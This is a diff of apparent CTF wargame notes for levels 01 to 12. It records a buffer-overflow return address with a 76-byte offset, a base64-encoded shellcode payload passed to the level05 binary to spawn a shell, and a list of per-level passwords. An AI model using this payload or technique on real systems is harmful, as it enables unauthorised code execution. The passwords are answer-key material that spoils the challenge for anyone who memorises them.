@@ -17,8 +17,7 @@ level03 -> 7WhHa5HWMNRAYl9T
   Address of `good` is @ 08048474, in hex.  Now, we want to craft the
     \x74\x84\x04\x08
 
-  I simply added noise until the program segfaulted with a bad address, that was 76 long,
-  the resulting address is:
+  I simply added noise until the program segfaulted with a bad address, that was 76 long, the resulting address is:
 
 level04 -> DNLM3Vu0mZfX0pDd
   >
@@ -98,7 +97,15 @@ level05 -> fQ8W8YlSBJBWKV2R
   // And we can execute it
   level05 $(echo 'amhoLy8vc2gvYmluieNoAQEBAYE0JHJpAQExyVFqBFkB4VGJ4THSagtYzYBg+/+/d3d3d3d3d3d3d3d3d3d3d3d3d3d3d3d3d3d3d3d3d3d3d3d3d3d3d3d3d3d3d3d3d3d3d3d3d3d3d3d3d3d3d3d3d3d3d3d3d3d3d3d3d3d3d3d3d3d3d3d3d3d3d3d3YPv/vw==' | base64 -d)
 
-
+level01 -> XNWFtWKWHhaaXoKI
+level02 -> OlhCmdZKbuzqngfz
+level03 -> 7WhHa5HWMNRAYl9T
+level04 -> DNLM3Vu0mZfX0pDd
+level05 -> fQ8W8YlSBJBWKV2R
 level06 -> U3A6ZtaTub14VmwV
 level07 -> VSIhoeMkikH6SGht
 level08 -> ise9uHhjOhZd0K4G
+level09 -> UT3ROlnUqI0R2nJA
+level10 -> fIpE1GkOkClE0j94
+level11 -> eQha2BTEgCUGoyKd
+level12 -> N5cmd4U9FWnpxmvN
